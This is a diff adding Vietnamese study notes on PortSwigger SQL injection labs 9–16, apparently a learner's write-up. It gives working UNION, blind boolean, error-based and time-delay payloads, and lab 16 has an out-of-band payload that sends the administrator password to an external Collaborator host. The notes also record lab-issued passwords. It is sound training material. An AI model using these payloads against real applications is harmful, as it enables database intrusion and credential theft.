@@ -811,3 +811,379 @@ administrator:jvja6if7qlajwx9p5mv6
 **administrator:wqfnnzd20pwxgsby82av**
 
 ![image-20250525194137387](./image/image-20250525194137387.png)
+
+### [Lab 9: SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
+
+Lab description: 
+
+Lỗ hổng sqli ở chức năng `category` filter cho phép sử dụng câu lệnh UNION SELECT để kết hợp truy vấn dữ liệu và lấy nhiều giá trị (vd: `username` và `password`) trong một cột duy nhất.
+
+Steps: 
+
+- Xác định số lượng cột mà truy vấn SQL gốc trả về:
+
+  ```sql
+  '+UNION+SELECT+NULL,NULL--
+  ```
+
+  ![image-20250601004858796](./image/image-20250601004858796.png)
+
+  
+
+  ![image-20250601004938979](./image/image-20250601004938979.png)
+
+  => kết quả query trả về giá trị ở 2 cột
+
+- Tìm cột hiển thị đầu ra trên trang web bằng cách chèn dữ liệu thử (ví dụ: 'abc') vào từng cột một. 
+
+  ![image-20250601005813569](./image/image-20250601005813569.png)
+
+  
+
+  ![image-20250601005624812](./image/image-20250601005624812.png)
+
+  => Giá trị trả về thứ 2 là dữ liệu kiểu text
+
+- TÌm thông tin database sử dụng: 
+
+Để trích xuất cả tên `username` và `password`, trong khi chỉ có một cột chuỗi duy nhất => có thể kết hợp nhiều giá trị vào các trường đơn. Cú pháp phụ thuộc vào ;loại cơ sở dữ liệu, vì vậy phải tìm ra cơ sở dữ liệu nào được sử dụng để tiến hành khai thác.
+
+![image-20250601010753567](./image/image-20250601010753567.png)
+
+=> PostgreSQL 
+
+- Kết hợp nhiều giá trị vào một cột, chẳng hạn dùng hàm || (PostgreSQL), + (SQL Server) hoặc CONCAT() (MySQL). Tạo truy vấn UNION phù hợp để kết xuất thông tin từ bảng users. Trích xuất dữ liệu `username`, `password`. 
+
+  ![image-20250601011408660](./image/image-20250601011408660.png)
+
+  **administrator**~**r230fvqkzyeyihhsscpw**
+
+- Sử dụng thông tin thu được để đăng nhập, hoàn thành lab:
+
+![image-20250601011541008](./image/image-20250601011541008.png)
+
+Defense: 
+
+### [Lab 10: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
+
+Lab description: Ứng dụng chứa lỗ hổng **Blind SQL Injection** tại cookie `TrackingId`. Kết quả truy vấn SQL không được hiển thị trực tiếp, nhưng nếu truy vấn trả về dữ liệu, trang sẽ hiển thị thông báo `"Welcome back"`. Mục tiêu là khai thác lỗ hổng để tìm mật khẩu của người dùng `administrator`
+
+![image-20250601013038123](./image/image-20250601013038123.png)
+
+sửa TrackingId: `TrackingId=xyz' AND '1'='2`
+
+![image-20250601013530248](./image/image-20250601013530248.png)
+
+=> Thông báo `Welcome back` không hiển thị nữa.
+
+Steps:
+
+- Kiểm tra xem bảng `users` có tồn tại hay không?
+
+  ![image-20250601015025746](./image/image-20250601015025746.png)
+
+  => tồn tại bảng `users`
+
+- Kiểm tra xem có user nào là `administrator` không?
+
+  ![image-20250601015249363](./image/image-20250601015249363.png)
+
+  => tồn tại user `administrator`
+
+- Kiểm tra độ dài `password`: send request to the Intruder
+
+  COnfig req in the intruder tab: https://infosecwriteups.com/blind-sql-injection-with-conditional-responses-from-portswigger-net-0276fecc31af
+
+  ![image-20250601021311510](./image/image-20250601021311510.png)
+
+  Kết quả có sự khác biệt rõ ràng về độ dài response 5432 và 5371: 
+
+  ![image-20250601021810068](./image/image-20250601021810068.png)
+
+  Len(password) > 20 là sai (Không trả về "Welcome back") => len(password) =20
+
+- đoán từng kí tự của password:
+
+  ```
+  Cookie: TrackingId=tJ1ux5PVRUX2vGYM ' and (select substring(password ,1,1) 
+  from users where username = 'administrator')= 'a' --
+  ```
+
+  ![image-20250601024958108](./image/image-20250601024958108.png)
+
+  => `oarsjwjw0evzvshek47a`
+
+  ![image-20250601025724178](./image/image-20250601025724178.png)
+
+Defense: 
+
+### [Lab 11: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
+
+Lab description: 
+
+Ứng dụng chứa lỗ hổng **Blind SQL Injection** tại cookie `TrackingId`. Kết quả truy vấn SQL không được hiển thị trực tiếp, và ứng dụng không phản hồi khác biệt dựa trên việc truy vấn trả về dữ liệu hay không. Tuy nhiên, nếu truy vấn SQL gây ra lỗi, ứng dụng sẽ trả về một thông báo lỗi.
+
+Cơ sở dữ liệu chứa bảng `users` với các cột `username` và `password`. Mục tiêu là khai thác lỗ hổng để tìm mật khẩu của người dùng `administrator`.
+
+Câu truy vấn có thể có dạng: `SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'`
+
+Cookie: `Cookie: TrackingId=chzqs7D5ztC4466n; session=szfVKbw4yMqEnhRWKeETvxDmwSAktNLj`
+
+Steps: 
+
+- Xác định tham số lỗi: 
+  - Thêm `'` hoặc `''` vào `TrackingId` và quan sát kết quả trả về của từng truy vấn:
+
+![image-20250601094349559](./image/image-20250601094349559.png)
+
+![image-20250601094711191](./image/image-20250601094711191.png)
+
+Khi chèn một dấu nháy đơn (`'`), server trả về lỗi. Nhưng khi chèn hai dấu nháy đơn (`''`), thì không có lỗi xảy ra. Điều này cho thấy có khả năng tồn tại lỗ hổng SQLi (input của người dùng được nhúng trực tiếp vào câu truy vấn), tiếp theo ta thử chèn một số câu lệnh SQL để dự đoán loại CSDL sử dụng trong bài lab.
+
+- Dự đoán loại CSDL sử dụng, sử dụng truy vấn: 
+
+  ![image-20250601093644550](./image/image-20250601093644550.png)
+
+  Hoặc một số câu truy vấn sử dụng các string concatenation khác nhau, vd: 
+
+  `'||(SELECT '')||'`
+
+  ![image-20250601095813035](./image/image-20250601095813035.png)
+
+  `'||(SELECT '' FROM dual)||'`
+
+  ![image-20250601095916769](./image/image-20250601095916769.png)
+
+  => Server lỗi khả năng cao sử dụng hệ QTCSDL Oracle
+
+- Tận dụng lỗi server trả về để suy luận dữ liệu:
+
+Chèn truy vấn một bảng không tồn tại: `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'` → lỗi.
+
+=> Truy vấn gây lỗi khi bảng không tồn tại nhưng không lỗi khi bảng tồn tại ⇒ có thể **suy luận sự tồn tại của bảng**. Áp dụng truy vấn bảng `users`, ta có kết quả:
+
+`TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
+
+![image-20250601100646239](./image/image-20250601100646239.png)
+
+=> server ok => tồn tại bảng `users`
+
+- Sử dụng `CASE WHEN` để kiểm tra điều kiện của truy vấn và response tương ứng của server, điều chỉnh truy vấn sao cho: ĐK là true => thông báo lỗi, từ đó lợi dụng để đoán password của user
+
+`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
+
+![image-20250601101528503](./image/image-20250601101528503.png)
+
+`case`: kiểm tra điều kiện, đúng thì thực hiện biểu thức 1, sai thì thực hiện biểu thức 2. Câu lệnh trên do điều kiện 1=1 đúng => thực hiện biểu thức 1/0 (Lỗi division by 0) => server trả về tbao lỗi.
+
+`'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
+
+![image-20250601102446516](./image/image-20250601102446516.png)
+
+=> điều kiện sai => server OK
+
+- Kiểm tra user `administrator` có tồn tại hay không?
+
+`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+
+![image-20250601102745753](./image/image-20250601102745753.png)
+
+=> tồn tại user `administrator`
+
+- Kiểm tra số kí tự của password (send req to intruder tab):
+
+`TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+
+![image-20250601103310852](./image/image-20250601103310852.png)
+
+![image-20250601103416825](./image/image-20250601103416825.png)
+
+
+
+![image-20250601103439444](./image/image-20250601103439444.png)
+
+=> Đến payload len>20 => server OK => condition FALSE => len(password) =20
+
+- Đoán từng kí tự của password: `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+
+![image-20250601103817181](./image/image-20250601103817181.png)
+
+Kết quả attack:
+
+![image-20250601111913796](./image/image-20250601111913796.png)
+
+=> **administrator**:**s8r0244d226urs4641lh**
+
+![image-20250601112138158](./image/image-20250601112138158.png)
+
+### [Lab 12: Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
+
+Lab description: 
+
+Ứng dụng chứa lỗ hổng **SQL Injection** tại cookie `TrackingId`. Kết quả của truy vấn không được hiển thị trực tiếp, nhưng nếu truy vấn gây ra lỗi, ứng dụng sẽ trả về thông báo lỗi chi tiết. 
+
+Cơ sở dữ liệu chứa bảng `users` với các cột `username` và `password`. Mục tiêu là khai thác lỗ hổng để tìm mật khẩu của người dùng `administrator`.
+
+Kiểm tra tham số lỗi, tương tự như Lab 11: 
+
+`Cookie: TrackingId=Te9XggW6WX7dbQz7; session=Ee2zPSrmKKBIOcYhRplYA9i4RzLdVJIZ`
+
+![image-20250601114416688](./image/image-20250601114416688.png)
+
+=> Thông báo lỗi được in ra
+
+Thêm `''` vào truy vấn => không có lỗi
+
+![image-20250601114654440](./image/image-20250601114654440.png)
+
+=> khả năng lỗi sqli với truy vấn tham số `TrackingId`
+
+Steps: 
+
+- Sử dụng `cast()` chuyển data type và quan sát kết quả: 
+
+![image-20250601115847233](./image/image-20250601115847233.png)
+
+=> lỗi arg của hàm AND (phải là kiểu boolean) sửa lại query: `' AND 1=CAST((SELECT 1) AS int)--`
+
+![image-20250601120009591](./image/image-20250601120009591.png)
+
+=> Truy vấn hợp lệ
+
+- Dùng câu lệnh select, lấy username: 
+
+`' AND 1=CAST((SELECT username FROM users) AS int)--`
+
+![image-20250601120254597](./image/image-20250601120254597.png)
+
+=> có vẻ như cả truy vấn và thông báo lỗi đều bị truncated => lỗi unterminated string (maybe `--` bị lược bỏ) => rút gọn query, xoá TrackingId: 
+
+![image-20250601120513138](./image/image-20250601120513138.png)
+
+=> lỗi mới: do query return > 1 row
+
+=> sửa query, cho return 1 row: 
+
+![image-20250601120657512](./image/image-20250601120657512.png)
+
+=> cast() thất bại => trả về lỗi dữ liệu, kèm cả tên user (kiểu text): `administartor`
+
+- Leak password: `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
+
+![image-20250601120854405](./image/image-20250601120854405.png)
+
+=> `administrator`:`g8l4nmt8x8db62a8wyj1`
+
+![image-20250601120951582](./image/image-20250601120951582.png)
+
+[Lab 13: Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
+
+Lab description: Ứng dụng chứa lỗ hổng **Blind SQL Injection** tại cookie `TrackingId`. Kết quả của truy vấn không được hiển thị trực tiếp, và ứng dụng không phản hồi khác biệt dựa trên việc truy vấn trả về dữ liệu hay gây lỗi. Tuy nhiên, do truy vấn được thực thi đồng bộ, có thể kích hoạt **độ trễ có điều kiện** để suy luận thông tin.
+
+Steps: 
+
+- Sửa `TrackingId` cookie thành:
+
+  ```
+  TrackingId=x'||pg_sleep(10)--
+  ```
+
+![image-20250601123228629](./image/image-20250601123228629.png)
+
+![image-20250601123422638](./image/image-20250601123422638.png)
+
+### [Lab 14: Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
+
+**Lab description**: Ứng dụng chứa lỗ hổng **Blind SQL Injection** tại cookie `TrackingId`. Kết quả của truy vấn không được hiển thị trực tiếp, và ứng dụng không phản hồi khác biệt dựa trên việc truy vấn trả về dữ liệu hay gây lỗi. Tuy nhiên, do truy vấn được thực thi đồng bộ, có thể kích hoạt **độ trễ có điều kiện** để suy luận thông tin. 
+
+Cơ sở dữ liệu chứa bảng `users` với các cột `username` và `password`. Mục tiêu là khai thác lỗ hổng để tìm mật khẩu của người dùng `administrator`.
+
+**Steps**: 
+
+- Kiểm tra độ trễ củ response: Như lab trước
+- Điều chỉnh query, điều kiện TRUE => có độ trễ trong response:
+
+```sql
+'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+```
+
+=> tồn tại user `administrator`
+
+- Sử dụng truy vấn điều kiện và độ trễ response để dự đoán số kí tự password:
+
+`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+
+![image-20250601124916100](./image/image-20250601124916100.png)
+
+- Dự đoán từng kí tự của password, send req to intruder tab: 
+
+`'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+
+![image-20250601125245592](./image/image-20250601125245592.png)
+
+Kết quả: dựa vào độ chênh lệch relay time của các response: 
+
+![image-20250601125502410](./image/image-20250601125502410.png)
+
+![image-20250601125716468](./image/image-20250601125716468.png)
+
+=> `administrator`:`93ncnzvhx130e7mz077o`
+
+![image-20250601125913699](./image/image-20250601125913699.png)
+
+### [Lab 15: Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
+
+**Lab des:** 
+
+Lab 15 chứa một lỗ hổng Blind SQL Injection với truy vấn `TrackingId`.
+
+Truy vấn SQL được thực thi một cách bất đồng bộ và không ảnh hưởng đến phản hồi của ứng dụng. Tuy nhiên, có thể kích hoạt các tương tác out-of-band với một tên miền bên ngoài.
+
+Để hoàn thành lab, phải khai thác lỗ hổng SQL Injection để tạo ra một truy vấn kích hoạt tra cứu DNS (DNS lookup) đến Burp Collaborator.
+
+**Steps:**
+
+- Thay đổi giá trị của cookie `TrackingId` thành một payload có khả năng kích hoạt tương tác với server Collaborator, kết hợp kỹ thuật SQL injection với XXE cơ bản:
+
+```sql
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+```
+
+![image-20250601131628951](./image/image-20250601131628951.png)
+
+### [Lab 16: Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
+
+**Lab des:** Bài lab này chứa một lỗ hổng Blind SQL Injection. Ứng dụng sử dụng cookie TrackingId cho mục đích phân tích, và thực hiện một truy vấn SQL chứa giá trị của cookie đó.
+
+Truy vấn SQL được thực hiện một cách bất đồng bộ và không ảnh hưởng trực tiếp đến phản hồi của ứng dụng. Tuy nhiên, có thể kích hoạt tương tác out-of-band với một tên miền bên ngoài.
+
+Cơ sở dữ liệu có một bảng tên là `users`, với các cột `username` và `password`. Nhiệm vụ là khai thác lỗ hổng Blind SQL Injection để tìm ra mật khẩu của tài khoản administrator.
+
+Để hoàn thành lab, cần đăng nhập thành công vào tài khoản `administrator`.
+
+**Steps**:
+
+- Thay đổi giá trị của cookie `TrackingId` thành một payload có khả năng kích hoạt tương tác với server Collaborator, kết hợp kỹ thuật SQL injection với XXE cơ bản:
+
+```sql
+'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
+
+- Nhấp chuột phải và chọn "Insert Collaborator payload" để chèn tên miền phụ (subdomain) của Burp Collaborator vào vị trí cần thiết trong cookie `TrackingId` đã chỉnh sửa.
+
+![image-20250601133614987](./image/image-20250601133614987.png)
+
+
+
+- Chuyển đến tab Collaborator và nhấn “Poll now”. Đợi vài giây rồi thử lại nếu không thấy tương tác nào được hiển thị, vì truy vấn phía server được thực thi bất đồng bộ.  Nếu payload thành công, ứng dụng phía server sẽ thực hiện truy vấn ra bên ngoài (ví dụ: DNS lookup hoặc HTTP request) tới Burp Collaborator.
+
+![image-20250601133652045](./image/image-20250601133652045.png)
+
+![image-20250601133817335](./image/image-20250601133817335.png)
+
+=> pass sẽ là phần sub domain của tên miền tương tác:       `**9jly9snx0kn9jylwhage.kay0s9k8xi6o5ch7p8jl77qf66cx0ood.oastify.com**`
+
+=> `administrator`:`9jly9snx0kn9jylwhage`
+
+![image-20250601133934809](./image/image-20250601133934809.png)
